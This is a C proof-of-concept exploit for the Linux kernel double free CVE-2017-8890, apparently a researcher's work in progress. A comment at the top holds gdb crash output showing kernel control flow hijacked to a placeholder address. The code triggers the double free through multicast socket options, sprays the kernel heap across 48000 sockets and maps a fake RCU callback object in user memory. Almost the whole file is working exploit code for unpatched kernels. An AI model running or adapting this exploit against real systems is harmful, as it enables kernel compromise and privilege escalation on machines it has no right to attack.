/*
step2 on 20180716 @ thinkycx 
success
deficiency：
    1. heap spray is not stable
    2. heap spray can only modify iml first 8 byte to 0x1000000a might 
    3. cannot debug it because nxtlist[RCU_NEXT_TAIL] will be modified and  the rcu thread cannot access 0x10000000a+0x20

Thread 581 received signal SIGSEGV, Segmentation fault.
[Switching to Thread 1559]
Warning: not running or target is remote
0xffffffff810f43e1 in __rcu_reclaim (rn=<optimized out>, head=<optimized out>)
    at /build/linux-hwe-edge-gyUj63/linux-hwe-edge-4.10.0/kernel/rcu/rcu.h:118
warning: Source file is more recent than executable.
118			head->func(head);
gdb-peda$ x/3i $pc
=> 0xffffffff810f43e1 <rcu_process_callbacks+497>:	call   rax
   0xffffffff810f43e3 <rcu_process_callbacks+499>:	add    r13,0x1
   0xffffffff810f43e7 <rcu_process_callbacks+503>:	cmp    QWORD PTR [rbp-0x30],r13
gdb-peda$ info registers 
rax            0xdeadbeafdeadbeaf	0xdeadbeafdeadbeaf
rbx            0xffffffff81e707c0	0xffffffff81e707c0
rcx            0x18040003d	0x18040003d
rdx            0x10000002a	0x10000002a
rsi            0xffffea0001d1df00	0xffffea0001d1df00
rdi            0x10000002a	0x10000002a
rbp            0xffff88007b603f60	0xffff88007b603f60
rsp            0xffff88007b603f18	0xffff88007b603f18
r8             0x7477ca01	0x7477ca01
r9             0x18040003d	0x18040003d
r10            0xffff88007477ca40	0xffff88007477ca40
r11            0x41c6200	0x41c6200
r12            0xffff88007b61a0b8	0xffff88007b61a0b8
r13            0x1	0x1
r14            0xffff88007935c2c8	0xffff88007935c2c8
r15            0xffff88007b61a080	0xffff88007b61a080
rip            0xffffffff810f43e1	0xffffffff810f43e1 <rcu_process_callbacks+497>
eflags         0x10282	[ SF IF RF ]
cs             0x10	0x10
ss             0x0	0x0
ds             0x0	0x0
es             0x0	0x0
fs             0x0	0x0
gs             0x5	0x5
gdb-peda$ list
113			kfree((void *)head - offset);
114			rcu_lock_release(&rcu_callback_map);
115			return true;
116		} else {
117			RCU_TRACE(trace_rcu_invoke_callback(rn, head));
118			head->func(head);
119			rcu_lock_release(&rcu_callback_map);
120			return false;
121		}
122	}

*/
// modify beraphin CVE-2017-8890.cpp
#include <stdio.h>
#include <stdlib.h>
#include <sys/select.h>  
#include <sys/socket.h>  
#include <arpa/inet.h>  
#include <netdb.h> 
#include <string.h> 
#include <unistd.h> 
#include <netinet/in.h> 
#include <fcntl.h> 
#include <time.h> 
#include <sys/types.h>
#include <pthread.h>
#include <net/if.h>
#include <errno.h>
#include <assert.h>
#include <sys/mman.h>
#include <stdbool.h> 



#define HELLO_WORLD_SERVER_PORT    6666 
#define LENGTH_OF_LISTEN_QUEUE 1
#define BUFFER_SIZE 1024
#define FILE_NAME_MAX_SIZE 512
bool server_init=false;
bool server_finish=false;
bool client_finish=false;




#define SPRAY_TIMES 48000 /* spray for the hole. */
static int ipv6_fd[SPRAY_TIMES]={0};
struct group_req gr_spray = {};
struct sockaddr_in6 in6_spray = {};
// #define FAKE_NEXT_RCU 0xc0000ff
#define FAKE_NEXT_RCU 0x000000010000000a


void init_spray()
{
    for ( int i = 0; i < SPRAY_TIMES ; i++ ) {
        if ((ipv6_fd[i] = socket(AF_INET6, SOCK_STREAM|SOCK_CLOEXEC, IPPROTO_IP)) < 0) {
            printf("[init_spray] %d, socket() failed.", i);
            perror("Socket");
           exit(errno);
        }

    }
}

// static int prepare_spray_obj(int fd, // 堆喷射 实现函数
//     struct group_req* gr_spray_ptr, 
//     struct sockaddr_in6* in6_spray_ptr, unsigned c)
// {
//     gr_spray_ptr->gr_interface = 1;
//     in6_spray_ptr->sin6_family = AF_INET6;  // 初始化  sin6_family
//     int8_t addr[16] = "\xff\x00\x00\x0c\x00\x00\x00\x00\x00\x00"; // 初始化  sin6_addr 劫持到用户态地址。
//     *(unsigned long*)&addr[8] = c+0xabcd000000000000;
//     memcpy(&in6_spray_ptr->sin6_addr, addr, sizeof(addr));
//     memcpy(&gr_spray_ptr->gr_group, in6_spray_ptr, sizeof(*in6_spray_ptr));
//     // printf("--------prepare_spray_obj  now  time is %d---------\n",c );
    
//     setsockopt(fd, SOL_IPV6, 0x2a, gr_spray_ptr, sizeof(*gr_spray_ptr));       //setsockopt 这个函数会kmalloc ------------------
// }

// void start_spray(){
//     for ( int i = 0; i < SPRAY_TIMES ; i++ ) {
//         prepare_spray_obj(ipv6_fd[i], &gr_spray, &in6_spray, i);
//         if(i%4000 ==0 ){
//             printf("spraytimes - %d |",i);
//         }
//     }

// }


static int prepare_spray_obj(int i)
{
    struct ip_mreq_source mreqsrc;
    memset(&mreqsrc,0,sizeof(mreqsrc));
    mreqsrc.imr_multiaddr.s_addr = htonl(inet_addr("10.10.2.224"));

    setsockopt(ipv6_fd[i], IPPROTO_IP, IP_ADD_SOURCE_MEMBERSHIP, &mreqsrc, sizeof(mreqsrc));

}

void start_spray(){
    for ( int i = 0; i < SPRAY_TIMES ; i++ ) {
        prepare_spray_obj(i);
        if(i%4000 ==0 ){
            printf("spraytimes - %d |",i);
        }
    }

}



void *modify_func(){
    unsigned long fix_addr = FAKE_NEXT_RCU + 8*5;
    unsigned long func = (unsigned long)0xdeadbeafdeadbeaf;
    while(1) {
        *(unsigned long *)(fix_addr) = func;    
    }
}
//#include <sys/mman.h>
static void init_fake_obj()
{
    void *addr_mmap = FAKE_NEXT_RCU-0xa;
    if ( mmap((void *)addr_mmap, 4096, PROT_READ|PROT_WRITE, 
         MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) < 0 )
         err(-1, "mmap at %p failed.", addr_mmap);
    unsigned long *addr_next_rcu = (unsigned long *)FAKE_NEXT_RCU;
    unsigned long func = (unsigned long)0xdeadbeafdeadbeaf;

    addr_next_rcu[0] = 0x0;
    addr_next_rcu[1] = 0x0a0a02e0;
    addr_next_rcu[2] = 0x00000002;
    addr_next_rcu[3] = 0x0;
    addr_next_rcu[4] = 0x0;
    addr_next_rcu[5] = func;

    pthread_t id_func_modify;
	pthread_create(&id_func_modify,NULL,modify_func,NULL);
    
}

void *server(void *arg)
{
    struct sockaddr_in server_addr;
    bzero(&server_addr,sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = htons(INADDR_ANY);
    server_addr.sin_port = htons(HELLO_WORLD_SERVER_PORT);

    struct	group_req group = {0};
    struct sockaddr_in *psin;

	psin = (struct sockaddr_in *)&group.gr_group;
    psin->sin_family = AF_INET;
    psin->sin_addr.s_addr = htonl(inet_addr("10.10.2.224"));

    int server_socket = socket(AF_INET,SOCK_STREAM,0);
    if( server_socket < 0)
    {
        printf("[Server]Create Socket Failed!\n");
        exit(1);
    }
    // { 
	   // int opt =1;
    //    //IPPROTO_IP
       setsockopt(server_socket, SOL_IP, MCAST_JOIN_GROUP, &group, sizeof (group));
    // }

    if( bind(server_socket,(struct sockaddr*)&server_addr,sizeof(server_addr)))
    {
        printf("[Server]Server Bind Port : %d Failed!\n", HELLO_WORLD_SERVER_PORT); 
        exit(1);
    }

        
    if ( listen(server_socket, LENGTH_OF_LISTEN_QUEUE) )
   {
       printf("[Server]Server Listen Failed!\n"); 
       exit(1);
    }

    struct sockaddr_in client_addr;
    socklen_t length = sizeof(client_addr);
 
 	server_init=true;
    printf ("[Server]accept..... \n"); 
    int new_server_socket = accept(server_socket,(struct sockaddr*)&client_addr,&length);
    if ( new_server_socket < 0)
    {
        close(server_socket);
        printf("[Server]Server Accept Failed!\n");
        return NULL;
    }
        
    printf("[Server]sleep 1s and close new_server_socket...[Attention] first free!...\n");
    sleep(1);
    // [1] SPRAY PREPARE
    init_spray();
    // 
    close(new_server_socket);
    //there must be a period between 2 close()???? 

    printf("[Server] sleep 5s to wait kfree_rcu...\n");
    sleep(5);

    // start_spray();
    
    printf("[Server] start spray...\n");
    // START SPRAY
    start_spray();

    // trigger
    printf("[Server]sleep 1s and close server_socket..[Attention] second free!...\n");
    sleep(1);
    close(server_socket);

	server_finish=true;
    return NULL;
}
void *client(void *arg){
	struct sockaddr_in client_addr;
	bzero(&client_addr,sizeof(client_addr));
	client_addr.sin_family=AF_INET;
	client_addr.sin_addr.s_addr=htons(INADDR_ANY);
	client_addr.sin_port=htons(0);
	int client_socket=socket(AF_INET,SOCK_STREAM,0);
	if(client_socket<0){
		printf("[Client]Create socket failed!\n");
		exit(1);
	}
	if(bind(client_socket,(struct sockaddr*)&client_addr,sizeof(client_addr))){
		printf("[Client] client bind port failed!\n");
		exit(1);
	}
	struct sockaddr_in server_addr;
	bzero(&server_addr,sizeof(server_addr));
	server_addr.sin_family=AF_INET;
	if(inet_aton("127.0.0.1",&server_addr.sin_addr)==0){
        /*
        int inet_aton(const char *cp, struct in_addr *inp);
        inet_aton() converts the Internet host address cp from the IPv4 numbers-and-dots notation into \
            binary form (in network byte order) and stores it in the structure that inp points to. 
        */
		printf("[Client]Server IP Address error\n");
		exit(0);
	}
	server_addr.sin_port=htons(HELLO_WORLD_SERVER_PORT);
	socklen_t server_addr_length=sizeof(server_addr);
	if(connect(client_socket,(struct sockaddr*)&server_addr,server_addr_length)<0){
		printf("[Client]cannot connect to 127.0.0.1!\n");
		exit(1);
	}
	printf("[Client]Close client socket...\n");
	close(client_socket);

    client_finish=true;
	return NULL;

}

int main(int argc,char* argv[])
{	
    init_fake_obj();
	pthread_t id_server, id_client;
	pthread_create(&id_server,NULL,server,NULL);
	while(!server_init){
		sleep(1);
	}
    printf("server init success...\n");

	pthread_create(&id_client,NULL,client,NULL);
	while(!client_finish){
        printf("client finish\n");
        break;
	}	
    while(!server_finish){
        printf("server finish...sleep 3s \n");
        sleep(3);
	}
	return 0;
}